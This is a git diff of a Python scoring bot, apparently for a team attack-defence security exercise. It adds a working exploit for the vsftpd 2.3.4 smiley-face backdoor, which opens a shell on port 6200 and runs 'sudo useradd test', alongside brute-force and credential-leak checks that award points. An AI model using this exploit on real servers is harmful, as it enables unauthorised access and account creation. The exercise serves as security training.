@@ -2,9 +2,10 @@ import time
 from time import sleep
 import requests
 import threading
+import warnings
+warnings.filterwarnings('ignore')
 
 import m1_brute
-import m2_cred
 
 scoreboard = "localhost"
 
@@ -34,9 +35,12 @@ def chk_alive(team):
 def add_score(team, points):
 	team = str(team)
 	points = str(points)
-	q = "http://" + scoreboard + "/add?team=" + team + "&score=" + points
-	requests.get(q)
-	print("team", team, "got points:", points)
+	try:
+		q = "http://" + scoreboard + "/add?team=" + team + "&score=" + points
+		requests.get(q)
+		print("team", team, "got points:", points)
+	except:
+		pass
 
 
 # ユーザーへのブルートフォース攻撃
@@ -63,6 +67,42 @@ for i in range(1, 9):
 
 # vsftpdの脆弱性を利用した攻撃
 
+from telnetlib import Telnet
+import argparse
+import sys
+import time
+
+def run(team_id, host, lp):
+	portFTP = "21"
+	user = "USER ayato:)"
+	password = "PASS pass"
+	time.sleep(2)
+	try:
+		tn = Telnet(host,portFTP,3)
+		time.sleep(1)
+		tn.read_until(b"(vsFTPd 2.3.4)")
+		tn.write(user.encode('ascii') + b"\n")
+		tn.read_until(b"password.")
+		tn.write(password.encode('ascii') + b"\n")
+		tn.close()
+		print("\033[31mteam",team_id, host, "vsftpd was hacked: connected\033[0m")
+	except:
+		print("team", team_id, host, "vsftpd was not hacked")
+		add_score(team_id, 50) # vsftpdの脆弱性を利用した接続を防いだ
+	try:
+		time.sleep(5)
+		tn2 = Telnet(host, lp, 3)
+		tn2.write(b'sudo useradd test\n')
+		print("\033[31mteam",team_id, host, "vsftpd was hacked: created `test` user\033[0m")
+	except:
+		print("team", team_id, host, "vsftpd was not hacked")
+		add_score(team_id, 100) # vsftpdの脆弱性を利用した攻撃を防いだ
+
+
+for i in range(1, 9):
+	threading.Thread(target=run, args=(i, teams[i],6200)).start()
+
+
 # クレデンシャル情報の流出
 
 def cred_attack(team_id):
@@ -84,6 +124,8 @@ def cred_attack(team_id):
 		add_score(team_id, 150) # クレデンシャル情報が流出しなかった
 		print("team", team_id, "could not get credentials")
 
+""" #クレデンシャル情報の流出のテスト
 for i in range(1, 9):
 	threading.Thread(target=cred_attack, args=(i,)).start()
+#"""
 
